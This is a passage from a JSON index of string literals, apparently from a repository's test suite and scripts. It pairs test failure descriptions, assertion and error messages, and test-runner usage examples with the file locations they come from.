      "value": "EXPECTED TO FAIL - CRITICAL DATABASE CONNECTIVITY ISSUE\n        Auth Service should handle database connectivity loss gracefully\n        Root cause: Auth Service crashes or becomes unresponsive when database is unreachable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:163"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL GRACEFUL SHUTDOWN ISSUE\n        Auth Service should shut down gracefully, finishing in-progress requests\n        Root cause: No graceful shutdown mechanism, abrupt termination causing request failures": {
      "value": "EXPECTED TO FAIL - CRITICAL GRACEFUL SHUTDOWN ISSUE\n        Auth Service should shut down gracefully, finishing in-progress requests\n        Root cause: No graceful shutdown mechanism, abrupt termination causing request failures",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:453"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL NETWORK PARTITION ISSUE\n        System should detect and handle Auth Service network partition\n        Root cause: No network partition detection or handling mechanisms": {
      "value": "EXPECTED TO FAIL - CRITICAL NETWORK PARTITION ISSUE\n        System should detect and handle Auth Service network partition\n        Root cause: No network partition detection or handling mechanisms",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:307"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL OAUTH PROVIDER ISSUE\n        Auth Service should handle OAuth provider connectivity loss\n        Root cause: No fallback when OAuth provider (Google, etc.) is unreachable": {
      "value": "EXPECTED TO FAIL - CRITICAL OAUTH PROVIDER ISSUE\n        Auth Service should handle OAuth provider connectivity loss\n        Root cause: No fallback when OAuth provider (Google, etc.) is unreachable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:382"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL OVERLOAD ISSUE\n        Auth Service should handle request overload with proper rate limiting/circuit breaker\n        Root cause: No circuit breaker or rate limiting when Auth Service is overwhelmed": {
      "value": "EXPECTED TO FAIL - CRITICAL OVERLOAD ISSUE\n        Auth Service should handle request overload with proper rate limiting/circuit breaker\n        Root cause: No circuit breaker or rate limiting when Auth Service is overwhelmed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:252"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL SERVER ERROR ISSUE\n        System should handle Auth Service 500 errors gracefully with retry/fallback\n        Root cause: No error handling when Auth Service returns 500 errors": {
      "value": "EXPECTED TO FAIL - CRITICAL SERVER ERROR ISSUE\n        System should handle Auth Service 500 errors gracefully with retry/fallback\n        Root cause: No error handling when Auth Service returns 500 errors",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:123"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL SERVICE DOWN ISSUE\n        System should have fallback when Auth Service is completely unresponsive\n        Root cause: No fallback mechanism when Auth Service doesn't respond at all": {
      "value": "EXPECTED TO FAIL - CRITICAL SERVICE DOWN ISSUE\n        System should have fallback when Auth Service is completely unresponsive\n        Root cause: No fallback mechanism when Auth Service doesn't respond at all",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:82"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL SSL CERT EXPIRY ISSUE\n        System should handle Auth Service SSL certificate expiration gracefully\n        Root cause: No SSL certificate monitoring or graceful handling of certificate expiry": {
      "value": "EXPECTED TO FAIL - CRITICAL SSL CERT EXPIRY ISSUE\n        System should handle Auth Service SSL certificate expiration gracefully\n        Root cause: No SSL certificate monitoring or graceful handling of certificate expiry",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:351"
      ]
    },
    "Each hash should be unique": {
      "value": "Each hash should be unique",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:147"
      ]
    },
    "Each password hash should be unique": {
      "value": "Each password hash should be unique",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:52"
      ]
    },
    "EdgeCaseTest123!": {
      "value": "EdgeCaseTest123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:155"
      ]
    },
    "Either --run-id or --workflow-name must be specified": {
      "value": "Either --run-id or --workflow-name must be specified",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:47",
        "scripts/test_verify_workflow_status_corrected.py:99"
      ]
    },
    "Emergency shutdown initiated": {
      "value": "Emergency shutdown initiated",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:112"
      ]
    },
    "Empty GOOGLE_CLIENT_ID not detected: '": {
      "value": "Empty GOOGLE_CLIENT_ID not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:282"
      ]
    },
    "Empty GOOGLE_CLIENT_ID: '": {
      "value": "Empty GOOGLE_CLIENT_ID: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:213"
      ]
    },
    "Empty GOOGLE_CLIENT_SECRET: '": {
      "value": "Empty GOOGLE_CLIENT_SECRET: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:220"
      ]
    },
    "Empty OAUTH_HMAC_SECRET: '": {
      "value": "Empty OAUTH_HMAC_SECRET: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:227"
      ]
    },
    "Empty code should be allowed (graceful handling)": {
      "value": "Empty code should be allowed (graceful handling)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:213"
      ]
    },
    "Empty function implementation found": {
      "value": "Empty function implementation found",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:232"
      ]
    },
    "Empty user ID should handle gracefully": {
      "value": "Empty user ID should handle gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:167"
      ]
    },
    "Empty user information": {
      "value": "Empty user information",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:269"
      ]
    },
    "Empty values": {
      "value": "Empty values",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:192"
      ]
    },
    "Enable continuous test generation in CI/CD pipeline": {
      "value": "Enable continuous test generation in CI/CD pipeline",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:263"
      ]
    },
    "Enable coverage reporting": {
      "value": "Enable coverage reporting",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:495",
        "scripts/test_frontend.py:401"
      ]
    },
    "Enables real-time agent interactions for": {
      "value": "Enables real-time agent interactions for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:492"
      ]
    },
    "End-to-End Cold Start Test Suite for Netra Apex Platform\n\nThis comprehensive test validates the entire user flow from cold start through\nauthentication, WebSocket connection, chat interaction, and model response.\n\nCritical Path Tested:\n1. Dev launcher startup with all services\n2. Service discovery and dynamic port handling\n3. Auth service login (dev mode)\n4. Token retrieval and validation\n5. WebSocket connection with auth\n6. Chat message sending\n7. Model processing and response\n8. Clean shutdown\n\nAuthor: Netra Apex Engineering": {
      "value": "End-to-End Cold Start Test Suite for Netra Apex Platform\n\nThis comprehensive test validates the entire user flow from cold start through\nauthentication, WebSocket connection, chat interaction, and model response.\n\nCritical Path Tested:\n1. Dev launcher startup with all services\n2. Service discovery and dynamic port handling\n3. Auth service login (dev mode)\n4. Token retrieval and validation\n5. WebSocket connection with auth\n6. Chat message sending\n7. Model processing and response\n8. Clean shutdown\n\nAuthor: Netra Apex Engineering",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:2"
      ]
    },
    "End-to-End Tests": {
      "value": "End-to-End Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:251"
      ]
    },
    "End-to-end integration tests": {
      "value": "End-to-end integration tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:53"
      ]
    },
    "End-to-end tests": {
      "value": "End-to-end tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:77"
      ]
    },
    "Endpoint": {
      "value": "Endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:55"
      ]
    },
    "Enforce maximum sessions per user": {
      "value": "Enforce maximum sessions per user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:53"
      ]
    },
    "Engine URL:": {
      "value": "Engine URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:141"
      ]
    },
    "Engine creation should succeed with valid staging credentials": {
      "value": "Engine creation should succeed with valid staging credentials",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:443"
      ]
    },
    "Engine not setup. Call setup_engine first.": {
      "value": "Engine not setup. Call setup_engine first.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:53"
      ]
    },
    "Engine:": {
      "value": "Engine:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:30"
      ]
    },
    "Enhanced Real Test Requirements Enforcer\n\nComprehensive validation and enforcement of SPEC/testing.xml real test requirements\nfor both Python and JavaScript test files.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction  \n- Value Impact: Prevents regression bugs from invalid test patterns\n- Strategic Impact: Ensures test reliability, reduces debugging time, maintains system integrity\n\nSPEC Requirements Enforced:\n1. No mock component implementations inside test files\n2. Integration tests must use real child components\n3. Mock only external APIs and truly unavailable resources\n4. Test files must follow 450-line limit\n5. Test functions must follow 25-line limit\n6. Fix System Under Test first, not tests": {
      "value": "Enhanced Real Test Requirements Enforcer\n\nComprehensive validation and enforcement of SPEC/testing.xml real test requirements\nfor both Python and JavaScript test files.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction  \n- Value Impact: Prevents regression bugs from invalid test patterns\n- Strategic Impact: Ensures test reliability, reduces debugging time, maintains system integrity\n\nSPEC Requirements Enforced:\n1. No mock component implementations inside test files\n2. Integration tests must use real child components\n3. Mock only external APIs and truly unavailable resources\n4. Test files must follow 450-line limit\n5. Test functions must follow 25-line limit\n6. Fix System Under Test first, not tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:1"
      ]
    },
    "Enhanced Registry": {
      "value": "Enhanced Registry",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:199"
      ]
    },
    "Enhanced Test Discovery Report": {
      "value": "Enhanced Test Discovery Report",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:165"
      ]
    },
    "Enhanced Test Discovery Report\nShows all test categories including real e2e tests prominently.": {
      "value": "Enhanced Test Discovery Report\nShows all test categories including real e2e tests prominently.",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:2"
      ]
    },
    "Ensure auth service is running for tests that require it": {
      "value": "Ensure auth service is running for tests that require it",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:510"
      ]
    },
    "Ensure file is valid and accessible": {
      "value": "Ensure file is valid and accessible",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:181"
      ]
    },
    "Environment async:": {
      "value": "Environment async:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:55"
      ]
    },
    "Environment auto async": {
      "value": "Environment auto async",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:281"
      ]
    },
    "Environment auto sync": {
      "value": "Environment auto sync",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:282"
      ]
    },
    "Environment expansion test - Service ID:": {
      "value": "Environment expansion test - Service ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:219"
      ]
    },
    "Environment sync:": {
      "value": "Environment sync:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:56"
      ]
    },
    "Environment to test against (default: test)": {
      "value": "Environment to test against (default: test)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:733"
      ]
    },
    "Environment variable case variant": {
      "value": "Environment variable case variant",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:393"
      ]
    },
    "Environment variables set for real service testing": {
      "value": "Environment variables set for real service testing",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:164"
      ]
    },
    "Environment variables:": {
      "value": "Environment variables:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:131"
      ]
    },
    "Environment:": {
      "value": "Environment:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:368",
        "scripts/test_database_url_builder_comprehensive.py:272",
        "scripts/test_staging_config.py:98",
        "scripts/test_staging_db_direct.py:81",
        "scripts/unified_test_runner.py:692"
      ]
    },
    "Environment: DATABASE_URL=": {
      "value": "Environment: DATABASE_URL=",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:254"
      ]
    },
    "Environment: STAGING": {
      "value": "Environment: STAGING",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:189"
      ]
    },
    "Error after deployment": {
      "value": "Error after deployment",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:134"
      ]
    },
    "Error analyzing": {
      "value": "Error analyzing",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:134",
        "scripts/compliance/test_size_validator.py:116"
      ]
    },
    "Error analyzing file": {
      "value": "Error analyzing file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:145"
      ]
    },
    "Error checking": {
      "value": "Error checking",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:86"
      ]
    },
    "Error checking git diff:": {
      "value": "Error checking git diff:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:247"
      ]
    },
    "Error checking size of": {
      "value": "Error checking size of",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:266"
      ]
    },
    "Error during fake test scanning:": {
      "value": "Error during fake test scanning:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:470"
      ]
    },
    "Error during validation (expected):": {
      "value": "Error during validation (expected):",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:202"
      ]
    },
    "Error during validation:": {
      "value": "Error during validation:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:185"
      ]
    },
    "Error fetching secret": {
      "value": "Error fetching secret",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:23",
        "scripts/test_ssl_certificates_staging.py:24",
        "scripts/test_staging_db_direct.py:26",
        "scripts/test_staging_migrations.py:23"
      ]
    },
    "Error fixing": {
      "value": "Error fixing",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:110",
        "scripts/automated_test_fix_loop.py:91",
        "scripts/fix_all_test_issues.py:76",
        "scripts/fix_test_import_errors.py:220",
        "scripts/fix_test_syntax_errors.py:219"
      ]
    },
    "Error fixing file:": {
      "value": "Error fixing file:",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:64"
      ]
    },
    "Error fixing mock component function in": {
      "value": "Error fixing mock component function in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:69"
      ]
    },
    "Error fixing parentheses in": {
      "value": "Error fixing parentheses in",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:116"
      ]
    },
    "Error fixing test config:": {
      "value": "Error fixing test config:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:237"
      ]
    },
    "Error fixing test discovery:": {
      "value": "Error fixing test discovery:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:342"
      ]
    },
    "Error killing process": {
      "value": "Error killing process",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:54"
      ]
    },
    "Error levels within acceptable limits": {
      "value": "Error levels within acceptable limits",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:104"
      ]
    },
    "Error loading Jest coverage:": {
      "value": "Error loading Jest coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:569"
      ]
    },
    "Error loading Python coverage:": {
      "value": "Error loading Python coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:558"
      ]
    },
    "Error loading test results:": {
      "value": "Error loading test results:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:585"
      ]
    },
    "Error parsing test file": {
      "value": "Error parsing test file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:87"
      ]
    },
    "Error processing": {
      "value": "Error processing",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:175",
        "scripts/align_test_imports.py:370",
        "scripts/analyze_test_overlap.py:132",
        "scripts/batch_fix_and_test.py:60",
        "scripts/fix_e2e_test_imports.py:187",
        "scripts/fix_test_syntax_fix_classes.py:61",
        "scripts/fix_test_utils_imports.py:56"
      ]
    },
    "Error rate reduced from 2.3% to 0.8%.": {
      "value": "Error rate reduced from 2.3% to 0.8%.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:216"
      ]
    },
    "Error reading": {
      "value": "Error reading",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:129"
      ]
    },
    "Error reading file": {
      "value": "Error reading file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:204"
      ]
    },
    "Error reading file:": {
      "value": "Error reading file:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:187"
      ]
    },
    "Error reading test file": {
      "value": "Error reading test file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:77"
      ]
    },
    "Error reducing mocking in": {
      "value": "Error reducing mocking in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:343"
      ]
    },
    "Error running validator:": {
      "value": "Error running validator:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:353"
      ]
    },
    "Error scanning": {
      "value": "Error scanning",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:220",
        "scripts/business_value_test_index.py:344"
      ]
    },
    "Error score:": {
      "value": "Error score:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:102",
        "scripts/test_error_monitor_logic.py:177",
        "scripts/test_error_monitor_logic.py:201"
      ]
    },
    "Error should mention URL problem for input:": {
      "value": "Error should mention URL problem for input:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:345"
      ]
    },
    "Error splitting": {
      "value": "Error splitting",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:207"
      ]
    },
    "Error splitting file": {
      "value": "Error splitting file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:122"
      ]
    },
    "Error splitting function": {
      "value": "Error splitting function",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:260"
      ]
    },
    "Error starting development server:": {
      "value": "Error starting development server:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:79"
      ]
    },
    "Error stopping development server:": {
      "value": "Error stopping development server:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:256"
      ]
    },
    "Error type:": {
      "value": "Error type:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:81",
        "auth_service/test_staging_db_connection.py:111",
        "auth_service/test_staging_db_connection.py:218"
      ]
    },
    "Error updating": {
      "value": "Error updating",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:127"
      ]
    },
    "Error:": {
      "value": "Error:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:70",
        "scripts/compliance/demo_test_size_enforcement.py:134",
        "scripts/test_auth_database_sessions.py:389",
        "scripts/test_database_url_builder_comprehensive.py:36",
        "scripts/test_database_url_builder_comprehensive.py:93",
        "scripts/test_database_url_builder_comprehensive.py:243",
        "scripts/test_database_url_builder_comprehensive.py:340",
        "scripts/test_oauth_local.py:371",
        "scripts/test_ssl_certificates_staging.py:228",
        "scripts/test_ssl_certificates_staging.py:297"
      ]
    },
    "Error: Could not find tests/e2e directory. Make sure script is run from project root.": {
      "value": "Error: Could not find tests/e2e directory. Make sure script is run from project root.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:226"
      ]
    },
    "Error: File": {
      "value": "Error: File",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:696"
      ]
    },
    "Error: Frontend directory not found at": {
      "value": "Error: Frontend directory not found at",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:206"
      ]
    },
    "Error: test_categorization.json not found. Run categorize_tests.py first.": {
      "value": "Error: test_categorization.json not found. Run categorize_tests.py first.",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:22"
      ]
    },
    "Errors Encountered:": {
      "value": "Errors Encountered:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:347"
      ]
    },
    "Errors encountered:": {
      "value": "Errors encountered:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:754"
      ]
    },
    "Errors:": {
      "value": "Errors:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:113",
        "scripts/fix_test_utils_imports.py:93",
        "scripts/test_example_message_flow.py:117",
        "scripts/test_example_message_flow.py:323"
      ]
    },
    "Est. Duration:": {
      "value": "Est. Duration:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:886"
      ]
    },
    "Estimated Duration:": {
      "value": "Estimated Duration:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:276"
      ]
    },
    "Example Message Flow Test Runner": {
      "value": "Example Message Flow Test Runner",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:432"
      ]
    },
    "Example Message Flow system is ready for production.": {
      "value": "Example Message Flow system is ready for production.",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:356"
      ]
    },
    "Example file not found!": {
      "value": "Example file not found!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:52",
        "scripts/compliance/demo_test_size_enforcement.py:167"
      ]
    },
    "Example file:": {
      "value": "Example file:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:145"
      ]
    },
    "Example refactoring:": {
      "value": "Example refactoring:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:215"
      ]
    },
    "Example split:": {
      "value": "Example split:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:199"
      ]
    },
    "Examples demonstrated:": {
      "value": "Examples demonstrated:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:158"
      ]
    },
    "Examples:\n  # Run all Jest tests\n  python unified_test_runner.py --service frontend\n  \n  # Run specific category\n  python unified_test_runner.py --service frontend --category components\n  python unified_test_runner.py --service frontend --category hooks\n  \n  # Run with coverage\n  python unified_test_runner.py --service frontend --coverage\n  \n  # Run E2E tests with Cypress\n  python unified_test_runner.py --service frontend --e2e\n  python unified_test_runner.py --service frontend --cypress-open\n  \n  # Run specific test file\n  python unified_test_runner.py --service frontend components/Button.test.tsx\n  \n  # Watch mode for development\n  python unified_test_runner.py --service frontend --watch\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service frontend --lint --type-check --coverage --build": {
      "value": "Examples:\n  # Run all Jest tests\n  python unified_test_runner.py --service frontend\n  \n  # Run specific category\n  python unified_test_runner.py --service frontend --category components\n  python unified_test_runner.py --service frontend --category hooks\n  \n  # Run with coverage\n  python unified_test_runner.py --service frontend --coverage\n  \n  # Run E2E tests with Cypress\n  python unified_test_runner.py --service frontend --e2e\n  python unified_test_runner.py --service frontend --cypress-open\n  \n  # Run specific test file\n  python unified_test_runner.py --service frontend components/Button.test.tsx\n  \n  # Watch mode for development\n  python unified_test_runner.py --service frontend --watch\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service frontend --lint --type-check --coverage --build",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:358"
      ]
    },
    "Examples:\n  # Run all tests\n  python unified_test_runner.py --service backend\n  \n  # Run specific category\n  python unified_test_runner.py --service backend --category unit\n  python unified_test_runner.py --service backend --category agent": {
      "value": "Examples:\n  # Run all tests\n  python unified_test_runner.py --service backend\n  \n  # Run specific category\n  python unified_test_runner.py --service backend --category unit\n  python unified_test_runner.py --service backend --category agent",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:449"
      ]
    },
    "Examples:\n  python scripts/compliance/fake_test_scanner.py --scan-all\n  python scripts/compliance/fake_test_scanner.py --directory app/tests\n  python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n  python scripts/compliance/fake_test_scanner.py --report-only --format json": {
      "value": "Examples:\n  python scripts/compliance/fake_test_scanner.py --scan-all\n  python scripts/compliance/fake_test_scanner.py --directory app/tests\n  python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n  python scripts/compliance/fake_test_scanner.py --report-only --format json",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:363"
      ]
    },
    "Examples:\n  python scripts/test_imports.py                  # Quick critical import test\n  python scripts/test_imports.py --all            # Comprehensive import test\n  python scripts/test_imports.py --verbose        # Show detailed output\n  python scripts/test_imports.py --json report.json  # Save JSON report": {
      "value": "Examples:\n  python scripts/test_imports.py                  # Quick critical import test\n  python scripts/test_imports.py --all            # Comprehensive import test\n  python scripts/test_imports.py --verbose        # Show detailed output\n  python scripts/test_imports.py --json report.json  # Save JSON report",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:31"
      ]
    },
    "Examples:\n  python test_refactor_helper.py analyze app/tests/test_large.py\n  python test_refactor_helper.py suggest app/tests/test_large.py --strategy category\n  python test_refactor_helper.py validate app/tests/test_large.py": {
      "value": "Examples:\n  python test_refactor_helper.py analyze app/tests/test_large.py\n  python test_refactor_helper.py suggest app/tests/test_large.py --strategy category\n  python test_refactor_helper.py validate app/tests/test_large.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:661"
      ]
    },
    "Examples:\n  python test_size_validator.py                    # Validate all tests\n  python test_size_validator.py --format json     # JSON output\n  python test_size_validator.py --format markdown # Markdown output\n  python test_size_validator.py --output report.md # Save to file\n  python test_size_validator.py --auto-split      # Auto-split violations": {
      "value": "Examples:\n  python test_size_validator.py                    # Validate all tests\n  python test_size_validator.py --format json     # JSON output\n  python test_size_validator.py --format markdown # Markdown output\n  python test_size_validator.py --output report.md # Save to file\n  python test_size_validator.py --auto-split      # Auto-split violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:509"
      ]
    },
    "Exception in": {
      "value": "Exception in",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:126"
      ]
    },
    "Exception:": {
      "value": "Exception:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:373",
        "scripts/test_database_url_builder_comprehensive.py:325",
        "scripts/test_ssl_certificates_staging.py:281",
        "scripts/test_staging_migrations.py:301"
      ]
    },
    "Exclude tests for specific environment": {
      "value": "Exclude tests for specific environment",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:739"
      ]
    },
    "Execute tests with full optimization pipeline": {
      "value": "Execute tests with full optimization pipeline",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:124"
      ]
    },
    "Executing category:": {
      "value": "Executing category:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:339"
      ]
    },
    "Execution Phases:": {
      "value": "Execution Phases:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:275"
      ]
    },
    "Execution failed": {
      "value": "Execution failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:241"
      ]
    },
    "Expected": {
      "value": "Expected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:318",
        "auth_service/tests/utils/assertion_helpers.py:248"
      ]
    },
    "Expected 'auth-service' in X-Service-Name header, got:": {
      "value": "Expected 'auth-service' in X-Service-Name header, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:205"
      ]
    },
    "Expected 'auth-service' in response, got:": {
      "value": "Expected 'auth-service' in response, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:209"
      ]
    },
    "Expected 'auth-service', got '": {
      "value": "Expected 'auth-service', got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:167"
      ]
    },
    "Expected 'cloud_sql' type, got '": {
      "value": "Expected 'cloud_sql' type, got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:240"
      ]
    },
    "Expected 'postgres' in URL:": {
      "value": "Expected 'postgres' in URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:103"
      ]
    },
    "Expected 'postgres' user, got '": {
      "value": "Expected 'postgres' user, got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:204"
      ]
    },
    "Expected 'postgres' username, got '": {
      "value": "Expected 'postgres' username, got '",
      "category": "test_literals",
